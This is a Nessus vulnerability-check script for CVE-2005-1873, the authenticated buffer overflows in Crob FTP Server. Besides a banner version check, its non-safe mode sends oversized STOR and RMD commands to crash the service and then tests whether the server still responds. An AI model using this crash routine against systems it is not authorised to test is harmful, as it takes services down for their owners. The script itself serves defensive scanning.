#
# (C) Tenable Network Security
#


  desc["english"] = "
Synopsis :

The remote FTP server is prone to multiple buffer overflow attacks. 

Description :

The version of Crob FTP Server on the remote host suffers from
multiple remote buffer overflows.  Once authenticated, an attacker can
exploit these vulnerabilities to crash the affected daemon and even
execute arbitrary code remotely within the context of the affected
service. 

See also : 

http://security.lss.hr/en/index.php?page=details&ID=LSS-2005-06-06

Solution : 

Upgrade to Crob FTP Server version 3.6.1 build 263 or later.

Risk factor : 

Medium / CVSS Base Score : 6 
(AV:R/AC:L/Au:R/C:C/A:C/I:C/B:N)";


if (description) {
  script_id(19236);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2005-1873");
  script_bugtraq_id(13847, 13848);

  name["english"] = "Crob FTP Server Buffer Overflow Vulnerabilities";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple buffer overflow vulnerabilities in Crob FTP Server";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Gain root remotely");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("ftp_overflow.nasl");
  script_exclude_keys("ftp/false_ftp");
  script_require_keys("ftp/login", "ftp/password");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("ftp_func.inc");
include('global_settings.inc');


port = get_kb_item("Services/ftp");
if (!port) port = 21;
if (!get_port_state(port)) exit(0);


# Check for the vulnerability.
if (safe_checks()) {
  s = get_ftp_banner(port:port);
  if (!s) exit(0);
  if (
    egrep(string:s, pattern:"^220-Crob FTP Server V([0-2][^0-9]|3\.([0-5][^0-9]|6\.0))") ||
    (
      report_paranoia > 1 &&
      egrep(string:s, pattern:"^220-Crob FTP Server V3\.6\.1")
    )
  ) {
    desc = str_replace(
      string:desc["english"],
      find:"Solution :",
      replace:string(
        "***** Nessus has determined the vulnerability exists on the remote\n",
        "***** host simply by looking at the version of Crob FTP Server\n",
        "***** installed there. If the version is 3.6.1 and the build is\n",
        "***** 263 or later, consider this a false positive.\n",
        "\n",
        "Solution :"
      )
    );
    security_warning(port:port, data:desc);
  }
 exit(0);
}
else {
  s = get_ftp_banner(port:port);
  if (!s || ("Crob FTP Server" >!< s)) exit(0);

 # nb: we need to log in to exploit the vulnerability.
 user = get_kb_item("ftp/login");
 pass = get_kb_item("ftp/password");
 if (!user || !pass) {
  if (log_verbosity > 1) debug_print("ftp/login and/or ftp/password are empty; skipped!", level:0);
  exit(1);
 }

 # Open a connection.
 soc = open_sock_tcp(port);
 if (!soc) exit(1);
 s = recv_line(socket:soc, length:1024);
 if (!strlen(s)) exit(1);


  if (!ftp_authenticate(socket:soc, user:user, pass:pass)) {
    if (log_verbosity > 1) debug_print("can't login with supplied ftp credentials; skipped!", level:0);
    close(soc);
    exit(1);
  }

  # Try to crash the service.
  buf = crap(4100);
  c = raw_string("STOR ", buf);
  send(socket:soc, data:string(c, "\r\n"));
  s = recv_line(socket:soc, length:1024);

  c = string("RMD ", buf);
  send(socket:soc, data:string(c, "\r\n"));
  s = recv_line(socket:soc, length:1024);

  soc2 = open_sock_tcp(port);
  if (soc2) {
    if (!ftp_authenticate(socket:soc2, user:user, pass:pass)) {
      security_warning(port);
    }
    ftp_close(socket:soc2);
  }

  ftp_close(socket:soc);
}
